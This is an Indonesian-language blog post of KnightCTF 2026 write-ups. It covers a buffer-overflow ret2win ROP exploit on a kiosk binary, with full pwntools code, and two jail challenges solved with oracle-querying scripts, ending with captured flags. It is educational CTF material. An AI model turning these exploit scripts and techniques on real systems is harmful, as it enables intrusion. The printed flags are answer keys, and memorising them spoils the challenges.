@@ -1,0 +1,895 @@
+---
+layout: post
+title: "KnightCTF 2026 - Pwn"
+date: 2026-01-21
+image: /assets/.
+categories: ["Knight"]
+tags: [pwn, ctf2026]
+---
+
+## Knight Squad Academy
+
+Target: `nc 66.228.49.41 5000`
+
+### Intro
+
+Ada tipe challenge pwn yang rasanya kayak lagi “ngisi formulir”, tapi di balik meja admin-nya ternyata ada pintu darurat yang kebuka lebar. `ksa_kiosk` ini masuk kategori itu: UI-nya kiosk pendaftaran kadet, sopan, ber-menu, bahkan ada “audit”—tapi satu kolom input-nya kebablasan dan ujung-ujungnya bisa nyuruh program ngebukain `flag.txt` buat kita.
+
+Write-up ini aku bawa dari nol: recon → baca jejak string → bedah dua fungsi penting → convert ASM ke pseudocode → bikin ROP yang rapi → tarik flag dari remote.
+
+---
+
+### Recon: “binary apa, proteksinya gimana?”
+
+Mulai dari yang paling dasar:
+
+```bash
+ls -la
+file ksa_kiosk
+```
+
+Hasilnya: ELF 64-bit, dynamically linked, **stripped**.
+
+Aku lanjut pakai `checksec` versi pwntools biar cepat kebaca posture mitigasinya:
+
+```python3
+from pwn import *
+elf = ELF('./ksa_kiosk')
+print(elf.checksec())
+```
+
+Yang penting buat pwn-nya:
+
+- **No PIE** → alamat `.text` statis (enak buat ROP).
+- **No canary** → stack overflow jadi “jujur”.
+- **NX enabled** → shellcode di stack nggak bisa, jadi arah kita ROP/ret2win.
+- **Full RELRO** → GOT overwrite bukan jalur mudah.
+
+Sekarang cari clue lewat string:
+
+```bash
+strings -a -n 4 ksa_kiosk
+```
+
+Ada ini yang langsung bikin ku tertarik:
+
+- `./flag.txt`
+- `Welcome, Cadet %s.`
+- `badge` / `token`
+- banyak prompt yang nunjuk ke flow input yang jelas
+
+Kalau challenge pwn punya string `flag.txt`, biasanya ada fungsi “admin-only” yang tinggal kita paksa buat jalan.
+
+---
+
+### Menggambar Peta: dua lokasi yang “wangi”
+
+Karena stripped, aku mainnya pakai `objdump` dan cari pola di `.text`.
+
+#### 1) Fungsi “admin-only” yang ngecek magic constant
+
+Di sekitar `0x4013ac` ada potongan yang kelihatan khas banget:
+
+```bash
+objdump -d -M intel --start-address=0x4013ac --stop-address=0x40150b ksa_kiosk
+```
+
+Bagian intinya:
+
+```asm
+0x4013be: movabs rax, 0x1337c0decafebeef
+0x4013c8: cmp    [rbp-0x98], rax       ; argumen pertama (rdi) dibandingin
+0x4013cf: je     0x4013fe              ; kalau cocok → lanjut
+0x4013d1: lea    rdi, [rip+...]        ; "[SECURITY] Authorization failed."
+0x4013db: call   puts
+0x4013f9: call   0x4011c6              ; exit(1)
+
+; kalau lolos:
+0x401412: call fopen("./flag.txt","r")
+0x4014ca: call fgets(buf, 0x80, fp)
+0x4014f4: call puts(buf)
+0x401509: ret
+```
+
+**Pseudocode:**
+
+```c
+// 0x4013ac
+void print_flag(uint64_t auth) {
+  if (auth != 0x1337C0DECAFEBEEF) {
+    puts("[SECURITY] Authorization failed.");
+    fflush(stdout);
+    exit(1);
+  }
+
+  FILE *fp = fopen("./flag.txt", "r");
+  if (!fp) {
+    puts("Server error.");
+    exit(1);
+  }
+
+  char buf[0x80] = {0};
+  fgets(buf, 0x80, fp);
+  fclose(fp);
+
+  puts("[Registry] Clearance badge issued:");
+  puts(buf);
+}
+```
+
+Kunci emasnya jelas: **kita harus memanggil fungsi ini dengan argumen tepat**.
+
+#### 2) Jalur input yang overflow
+
+Sekarang cari bagian yang baca “Enrollment notes”.
+
+```bash
+objdump -d -M intel --start-address=0x401514 --stop-address=0x401687 ksa_kiosk
+```
+
+Potongan paling “pas”-nya:
+
+```asm
+0x401518: sub rsp, 0x70
+...
+0x4015b9: lea rax, [rbp-0x70]   ; buffer notes
+0x4015bd: mov edx, 0xf0         ; size = 240 byte
+0x4015c5: mov edi, 0            ; stdin
+0x4015ca: call read@plt         ; read(0, buf, 0xf0)
+```
+
+Buffer cuma `0x70` (112) byte, tapi dibaca `0xf0` (240) byte. Itu overflow bersih sampai **saved RBP** dan **RIP**.
+
+**Pseudocode:**
+
+```c
+// 0x401514 (menu option: Register cadet)
+void register_cadet(void) {
+  char name[0x20];     // [rbp-0x30]
+  char notes[0x70];    // [rbp-0x70]
+
+  puts("--- Cadet Registration ---");
+  puts("Cadet name:");
+  read_line(0, name, 0x20);       // helper internal 0x4011f7
+
+  puts("Enrollment notes:");
+  ssize_t n = read(0, notes, 0xF0); // BUG: overflow
+  if (n <= 0) exit(1);
+
+  if (memmem(notes, n, "badge", 5) || memmem(notes, n, "token", 5))
+    puts("[Audit] Entry queued for manual review.");
+  else
+    puts("[Enrollment] Entry received.");
+
+  printf("Welcome, Cadet %s.\n", name);
+  puts("Please wait for assignment.");
+}
+```
+
+Di sini game plan-nya kebaca:
+
+1. Kita masuk menu `1) Register cadet`.
+2. Isi nama bebas (nggak krusial).
+3. Di `Enrollment notes`, kita kirim payload overflow → ambil alih RIP.
+4. Karena NX on, payload kita bukan shellcode, tapi **ROP chain**.
+
+---
+
+### Menentukan Offset RIP: biar nggak “ngira-ngira”
+
+Aku pakai `cyclic()` dari pwntools supaya offset-nya presisi:
+
+```python3
+from pwn import *
+context.binary = './ksa_kiosk'
+
+p = process('./ksa_kiosk')
+p.sendlineafter(b'> ', b'1')
+p.sendlineafter(b'Cadet name:', b'A')
+p.sendafter(b'Enrollment notes:', cyclic(220))
+p.wait()
+
+core = p.corefile
+print('RIP:', hex(core.rip))
+print('fault_addr:', hex(core.fault_addr))
+print('offset:', cyclic_find(p32(core.fault_addr & 0xffffffff)))
+```
+
+Kenapa `fault_addr`? Karena crash-nya terjadi saat `ret` mencoba loncat ke address yang sudah ketimpa pattern cyclic—lebih gampang diambil dari situ.
+
+Hasilnya:
+
+- Offset ke saved RIP = **120** (`0x78`), cocok juga secara teori: `0x70 (buffer) + 0x8 (saved RBP)`.
+
+---
+
+### ROP: “ret2win” yang rapi
+
+Sekarang kita cuma butuh 3 hal:
+
+1. Gadget `pop rdi; ret` buat ngisi argumen pertama fungsi.
+2. Alamat fungsi `print_flag(auth)` itu sendiri.
+3. (Opsional) `ret` single buat stack alignment.
+
+Dari disassembly:
+
+- `print_flag` = `0x4013ac`
+- `pop rdi; ret` = `0x40150b`
+- `ret` = `0x401188`
+- `MAGIC` = `0x1337c0decafebeef`
+
+ROP chain-nya:
+
+```text
+padding (120)
+ret                      ; alignment
+pop rdi ; ret
+0x1337c0decafebeef
+0x4013ac                 ; print_flag(magic)
+pop rdi ; ret
+0                        ; _exit(0)
+_exit@plt
+```
+
+---
+
+### Exploit Script
+
+```python3
+#!/usr/bin/env python3
+from pwn import *
+
+
+HOST = args.HOST or "66.228.49.41"
+PORT = int(args.PORT or 5000)
+
+context.binary = elf = ELF("./ksa_kiosk")
+context.terminal = ["tmux", "splitw", "-h"]
+
+
+OFFSET = 120
+MAGIC = 0x1337C0DECAFEBEEF
+
+RET = 0x401188
+POP_RDI_RET = 0x40150B
+PRINT_FLAG = 0x4013AC
+EXIT = elf.plt["_exit"]
+
+
+def build_payload() -> bytes:
+    chain = [
+        RET,
+        POP_RDI_RET,
+        MAGIC,
+        PRINT_FLAG,
+        POP_RDI_RET,
+        0,
+        EXIT,
+    ]
+    payload = b"A" * OFFSET + flat(chain)
+    return payload.ljust(0xF0, b"B")
+
+
+def start():
+    if args.LOCAL:
+        return process(elf.path)
+    return remote(HOST, PORT)
+
+
+def main():
+    io = start()
+
+    io.sendlineafter(b"> ", b"1")
+    io.sendlineafter(b"Cadet name:\n> ", b"A")
+    io.sendafter(b"Enrollment notes:\n> ", build_payload())
+
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Tinggal jalankan saja:
+
+```bash
+python3 solve.py
+```
+Output remote yang kita kejar akan nge-print:
+
+```
+[Registry] Clearance badge issued:
+Your Flag : KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_} ...
+```
+
+### Flag
+
+`KCTF{_We3Lc0ME_TO_Knight_Squad_Academy_}`
+
+---
+
+## KSA Jail
+
+Target: `nc 66.228.49.41 1337`
+
+### Intro
+
+Ada tipe challenge jail yang nggak ngajak kita “kabur lewat `import os`”, tapi ngajak kita **ngobrol pelan-pelan** sampai dia keceplosan sendiri.
+
+Kelihatannya kayak kalkulator Python mini. Tapi setiap kali coba “gerak sedikit” (attribute, indexing, function aneh), dia langsung nyolot: *node not allowed*. Dan di situlah twist-nya: kalau kita nggak bisa nyusun string dengan bebas, kita *nggak akan* bruteforce “kata”. Jadi kita mainnya sesuai deskripsi: **char by char**.
+
+---
+
+### Recon: “ini jail yang modelnya gimana?”
+
+Pas connect, kita disambut gini:
+
+```text
+== KSA Jail ==
+>
+```
+
+Kita tes hal-hal dasar:
+
+```text
+> 1+2
+3
+> "a"
+'a'
+```
+
+Terlihat evaluator ini nge-print hasil ekspresi.
+
+Tapi begitu kita coba trik jail klasik:
+
+```text
+> __import__("os")
+error: unknown function: __import__
+> (1).__class__
+error: node not allowed: Attribute
+> "a"[0]
+error: node not allowed: Subscript
+```
+
+Ada dua pesan yang jadi “peta”:
+
+- `error: node not allowed: ...` → ada **AST whitelist** (bukan sekadar blacklist kata).
+- `error: only direct function calls allowed` → kita cuma boleh call fungsi yang *langsung berupa Name*, bukan hasil ekspresi.
+
+Tambahan yang penting: operasi string juga dipangkas.
+
+```text
+> "a"+"b"
+error: binop types must be int/bool
+```
+
+Artinya: kita tidak bisa bikin payload “bangun string panjang” di dalam jail. Kalau ada jalan, jalan itu harus lewat **API/Oracle** yang disediakan.
+
+---
+
+### Momen Kunci: ternyata ada “Oracle” bawaan
+
+Karena error-nya spesifik `name not allowed: ...`, aku curiga ada daftar nama yang diizinkan. Cara paling murah: brute satu-huruf buat cari function yang nggak ditolak total.
+
+Contoh konsepnya:
+
+```python3
+from pwn import *
+import string
+
+io = remote("66.228.49.41", 1337)
+io.recvuntil(b"> ")
+
+for ch in string.ascii_letters + "_":
+    io.sendline(f"{ch}(0)".encode())
+    out = io.recvuntil(b"> ")[:-2].decode("latin-1", "replace")
+    if "unknown function" not in out and "name not allowed" not in out:
+        print(ch, "=>", out.strip())
+```
+
+Hasilnya yang “nyangkut” cuma tiga:
+
+- `L()`
+- `Q(i, x)`
+- `S("...")`
+
+Sekarang tinggal kita pahami satu-satu, purely dari perilaku.
+
+---
+
+### Bedah Oracle: L, Q, S
+
+#### 1) `L()` → panjang secret
+
+```text
+> L()
+28
+```
+
+Jadi secret-nya panjangnya 28 karakter.
+
+#### 2) `Q(i, x)` → komparator karakter ke-`i`
+
+Kalau kita mainkan `Q(0, ...)` (posisi 0), polanya kebaca jelas:
+
+```text
+> Q(0,70)
+-1
+> Q(0,75)
+0
+> Q(0,80)
+1
+```
+
+Interpretasinya:
+
+- `-1` → tebakan kita **kekecilan** (kode ASCII secret[i] lebih besar dari `x`)
+- `0` → pas
+- `1` → tebakan kita **kebesaran**
+
+Bonus: kalau `i` di luar range, dia marah:
+
+```text
+> Q(28,0)
+error: index out of range
+```
+
+#### 3) `S("...")` → submit full string (cek benar/salah)
+
+```text
+> S("abc")
+'Nope.'
+```
+
+Kalau tepat, dia ngasih selamat.
+
+---
+
+### Exploit: ambil flag char-by-char pakai binary search
+
+Kita sudah punya semua yang dibutuhin:
+
+1. `L()` untuk tau panjang `n`.
+2. `Q(i, x)` sebagai oracle pembanding.
+3. `S(flag)` buat verifikasi.
+
+Karena `Q` sifatnya monoton (lebih kecil/lebih besar), strategi paling bersih: **binary search** ASCII untuk setiap index.
+
+- Range yang aman: `0..127` (ASCII).
+- Kompleksitas: `n * log2(128)` → `28 * 7 = 196` query. Super murah.
+
+Algoritmanya:
+
+```text
+for i in [0..L()-1]:
+  lo=0, hi=127
+  while lo<=hi:
+    mid=(lo+hi)//2
+    r=Q(i, mid)
+    if r==0: char=mid; break
+    if r<0: lo=mid+1      # secret[i] > mid
+    if r>0: hi=mid-1      # secret[i] < mid
+```
+
+Hasil nya:
+
+```
+KCTF{_n_o_w_o_r_d_s_c_h_a_r}
+```
+
+---
+
+### Solver (final)
+
+```python3
+#!/usr/bin/env python3
+import argparse
+import socket
+
+
+PROMPT = b"> "
+
+
+def recv_until(sock: socket.socket, needle: bytes) -> bytes:
+    data = b""
+    while needle not in data:
+        chunk = sock.recv(4096)
+        if not chunk:
+            raise ConnectionError("connection closed")
+        data += chunk
+    return data
+
+
+def send_expr(sock: socket.socket, expr: str) -> str:
+    sock.sendall(expr.encode() + b"\n")
+    out = recv_until(sock, PROMPT)
+    return out[: -len(PROMPT)].decode("latin-1", errors="replace").strip()
+
+
+def oracle_len(sock: socket.socket) -> int:
+    return int(send_expr(sock, "L()"))
+
+
+def oracle_cmp(sock: socket.socket, index: int, guess: int) -> int:
+    return int(send_expr(sock, f"Q({index},{guess})"))
+
+
+def oracle_submit(sock: socket.socket, s: str) -> str:
+    s = s.replace("\\", "\\\\").replace('"', '\\"')
+    return send_expr(sock, f'S("{s}")')
+
+
+def recover_flag(sock: socket.socket) -> str:
+    n = oracle_len(sock)
+    chars: list[str] = []
+    for i in range(n):
+        lo, hi = 0, 127
+        while lo <= hi:
+            mid = (lo + hi) // 2
+            c = oracle_cmp(sock, i, mid)
+            if c == 0:
+                chars.append(chr(mid))
+                break
+            if c < 0:
+                lo = mid + 1
+            else:
+                hi = mid - 1
+        else:
+            raise RuntimeError(f"failed to recover index {i}")
+    return "".join(chars)
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--host", default="66.228.49.41")
+    ap.add_argument("--port", type=int, default=1337)
+    args = ap.parse_args()
+
+    with socket.create_connection((args.host, args.port), timeout=10) as sock:
+        recv_until(sock, PROMPT)
+        flag = recover_flag(sock)
+        print(flag)
+        print(oracle_submit(sock, flag))
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+Jalankan:
+
+```bash
+python3 solve.py --host 66.228.49.41 --port 1337
+```
+
+Output-nya:
+
+```text
+KCTF{_n_o_w_o_r_d_s_c_h_a_r}
+'Correct! ...'
+```
+
+### Flag
+
+`KCTF{_n_o_w_o_r_d_s_c_h_a_r}`
+
+---
+
+## Knight Squad Academy Jail 2
+
+Target: `nc 66.228.49.41 41567`
+
+### Intro
+
+Di deskripsion nya kita di kasih tahu:
+
+> “in the world of Knight Squad Academy jail only a knight can help you!”
+
+Begitu nyambung, yang kita dapet cuma satu layar:
+
+```bash
+$ nc 66.228.49.41 41567
+== Knight Squad Academy Jail 2 ==
+>
+```
+
+Nggak ada menu, nggak ada help, nggak ada banner panjang yang ngasih clue. Cuma tanda `>` dan harapan palsu.
+
+Di write-up ini aku ceritain perjalanan dari “ini apaan sih?” sampai bisa “lulus” dari jail—pakai cara yang rapi, cepat, dan (jujur) agak bikin ketawa karena yang kita pecahin bukan sandbox yang rumit… tapi oracle yang terlalu baik hati.
+
+---
+
+### Recon: Kenalan Dulu Sama “Bahasa”-nya
+
+Kebiasaan pertama kalau ketemu *jail*: coba hal-hal standar.
+
+```bash
+> ls
+error
+> 1+1
+error
+> print(1)
+print() doesn't exist
+```
+
+Itu menarik: bukannya “syntax error” untuk semuanya. Dia bisa *ngenalin* nama fungsi, dan kalau nggak ada, dia bilang `X() doesn't exist`.
+
+Aku tes beberapa builtins “klasik”:
+
+```text
+help() doesn't exist
+dir() doesn't exist
+eval() doesn't exist
+open() doesn't exist
+__import__() doesn't exist
+```
+
+Kesimpulan awal: ini bukan Python/JS/Ruby biasa. Ini interpreter custom dengan whitelist fungsi sangat ketat.
+
+Terus muncul satu nama yang “kena” respons berbeda:
+
+```text
+> knight()
+error
+> knight("a")
+too short
+```
+
+Nah. Di titik ini kita punya pegangan:
+
+- Ada fungsi `knight(...)`
+- Argumennya string
+- Ada validasi panjang (“too short” / “too long”)
+
+---
+
+### Mapping Interface: Panjang Input dan Output Misterius
+
+Aku cari panjang yang pas dengan trial cepat. Polanya begini:
+
+- `< 30` → `too short`
+- `> 30` → `too long`
+- `== 30` → ngeluarin dua angka (format: `X Y`)
+
+Contoh yang bikin “klik”:
+
+```text
+> knight("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")   # 30 a
+1 0
+```
+
+Jadi fungsi `knight()` ngasih feedback dua angka. Ini hampir pasti semacam:
+
+- skor “benar posisi”
+- skor “benar karakter tapi salah posisi”
+
+Alias: *Bulls and Cows* (atau Mastermind versi string).
+
+Dan ini bukan asumsi kosong—kalau kamu pakai input random 30 char, angkanya berubah-ubah.
+
+---
+
+## Exploit Bagian 1: Bocorin Multiset Karakter (Tanpa Tahu Posisinya)
+
+Trik pertama super sederhana:
+
+Kalau kita kirim string 30 karakter yang sama, mis. `"A"*30`, maka `bulls` yang keluar = **berapa kali `A` muncul di secret**.
+
+Karena:
+- setiap `A` di secret, pasti berada di suatu posisi
+- guess kita juga `A` di posisi itu
+- berarti jadi bull
+
+Jadi kita tinggal scan karakter printable ASCII:
+
+```python
+for ch in printable_ascii:
+    bulls, cows = knight(ch * 30)
+    if bulls != 0:
+        print(ch, bulls)
+```
+
+Hasilnya (multiset secret) ketemu lengkap dan totalnya pas 30:
+
+```text
+{'0': 1, 'A': 1, 'C': 1, 'E': 2, 'F': 1, 'H': 1, 'I': 1, 'J': 1,
+ 'K': 2, 'L': 1, 'N': 1, 'O': 1, 'R': 2, 'T': 1, 'U': 1, 'Y': 1,
+ '_': 5, 'a': 1, 'b': 1, 'o': 1, 't': 1, '{': 1, '}': 1}
+```
+
+Perhatikan: sudah kelihatan banget `KCTF{...}`-nya, dan ada cukup banyak underscore buat bikin “format” flag terasa wajar.
+
+---
+
+### Exploit Bagian 2: Lock Posisi Satu-satu Pakai “Dummy Char”
+
+Sekarang kita tahu *karakternya apa saja*, tapi belum tahu urutannya.
+
+Di sini kita butuh satu karakter “dummy” yang **pasti tidak ada** di secret.
+
+Cara ngeceknya gampang: query `~*30`. Kalau `bulls == 0`, aman.
+
+Lalu untuk setiap posisi `i`:
+
+- bikin guess 30 char: semuanya dummy `~`
+- set `guess[i] = candidate`
+- kirim ke oracle
+- kalau `bulls == 1`, berarti kandidat tepat di posisi itu
+
+Kenapa yakin `bulls` jadi 1?
+
+- dummy tidak pernah match (kontribusi 0 bulls)
+- cuma ada satu posisi yang kita isi kandidat
+- kalau cocok, ya bull tepat 1
+
+Secara kompleksitas: `30 * |charset|` query. Dengan charset kecil (cuma char yang ada di secret), ini cepat.
+
+---
+
+### Eksekusi: Script Solver
+
+```python3
+#!/usr/bin/env python3
+import argparse
+import socket
+import string
+import time
+
+
+PROMPT = b"> "
+
+
+def recv_until(sock: socket.socket, marker: bytes) -> bytes:
+    data = b""
+    while marker not in data:
+        chunk = sock.recv(4096)
+        if not chunk:
+            raise EOFError("connection closed")
+        data += chunk
+    return data
+
+
+def escape_double_quoted(s: str) -> str:
+    return s.replace("\\", "\\\\").replace('"', '\\"')
+
+
+class Oracle:
+    def __init__(self, host: str, port: int, reconnect_every: int = 250):
+        self.host = host
+        self.port = port
+        self.reconnect_every = reconnect_every
+        self._sock: socket.socket | None = None
+        self._queries_on_sock = 0
+        self._connect()
+
+    def _connect(self) -> None:
+        for attempt in range(5):
+            if self._sock is not None:
+                try:
+                    self._sock.close()
+                except OSError:
+                    pass
+                self._sock = None
+            try:
+                self._sock = socket.create_connection((self.host, self.port), timeout=15)
+                self._sock.settimeout(15)
+                recv_until(self._sock, PROMPT)
+                self._queries_on_sock = 0
+                return
+            except (OSError, TimeoutError, EOFError):
+                time.sleep(0.2 * (attempt + 1))
+        raise RuntimeError("failed to connect to oracle")
+
+    def query(self, guess: str) -> tuple[int, int] | str:
+        if self._sock is None:
+            self._connect()
+        if self._queries_on_sock >= self.reconnect_every:
+            self._connect()
+
+        line = f'knight("{escape_double_quoted(guess)}")\n'.encode("latin1")
+
+        for _ in range(3):
+            try:
+                assert self._sock is not None
+                self._sock.sendall(line)
+                self._queries_on_sock += 1
+                out = recv_until(self._sock, PROMPT).decode("latin1", "ignore")
+                first = out.strip().split("\n", 1)[0].strip()
+                parts = first.split()
+                if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
+                    return int(parts[0]), int(parts[1])
+                return first
+            except (EOFError, OSError, TimeoutError):
+                time.sleep(0.05)
+                self._connect()
+        raise RuntimeError("oracle query failed after retries")
+
+
+def discover_multiset(oracle: Oracle) -> dict[str, int]:
+    counts: dict[str, int] = {}
+    for ch in (chr(i) for i in range(32, 127)):  # printable ASCII
+        res = oracle.query(ch * 30)
+        if isinstance(res, str):
+            continue
+        bulls, _cows = res
+        if bulls:
+            counts[ch] = bulls
+    if sum(counts.values()) != 30:
+        raise RuntimeError(f"expected 30 total chars, got {sum(counts.values())}: {counts}")
+    return counts
+
+
+def recover_secret(oracle: Oracle, charset: list[str], dummy: str = "~") -> str:
+    if dummy in charset:
+        raise ValueError("dummy character must not be in charset")
+
+    base = [dummy] * 30
+    secret = ["?"] * 30
+
+    for i in range(30):
+        found = None
+        for ch in charset:
+            guess = base.copy()
+            guess[i] = ch
+            res = oracle.query("".join(guess))
+            if isinstance(res, str):
+                continue
+            bulls, _cows = res
+            if bulls == 1:
+                found = ch
+                break
+        if found is None:
+            raise RuntimeError(f"no matching character found for position {i}")
+        secret[i] = found
+    return "".join(secret)
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--host", default="66.228.49.41")
+    ap.add_argument("--port", default=41567, type=int)
+    args = ap.parse_args()
+
+    oracle = Oracle(args.host, args.port)
+    counts = discover_multiset(oracle)
+    charset = list(counts.keys())
+    flag = recover_secret(oracle, charset)
+    print(flag)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+```
+
+Jalanin:
+
+```bash
+python3 solve.py --host 66.228.49.41 --port 41567
+```
+
+Output:
+
+```text
+KCTF{_aNOtHER_JAIL_Y0U_bRoKE_}
+```
+
+Kita verif:
+
+```bash
+printf 'knight(\"KCTF{_aNOtHER_JAIL_Y0U_bRoKE_}\")\\n' | nc 66.228.49.41 41567
+```
+
+Dan server balas:
+
+```text
+GRADUATED ✅
+```
+
+### Flag
+
+`KCTF{_aNOtHER_JAIL_Y0U_bRoKE_}`
+
+---
+
